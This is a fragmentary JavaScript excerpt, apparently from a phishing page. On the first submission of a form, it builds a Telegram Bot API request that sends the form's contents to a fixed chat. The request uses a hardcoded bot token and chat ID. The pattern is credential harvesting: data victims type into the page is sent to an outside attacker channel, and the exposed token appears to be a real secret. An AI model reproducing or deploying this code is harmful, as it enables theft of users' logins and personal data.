    ...
    form.addEventListener('submit', function(e) {
        ...
        if (tryCount === 0) {
            ...
            setTimeout(() => {
                ...
                const url = `https://api.telegram.org/bot7138995652:AAGvoO-kCNcVXolUCo7I-KP5of2KZqh1gAc/sendMessage?chat_id=1575393206&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;
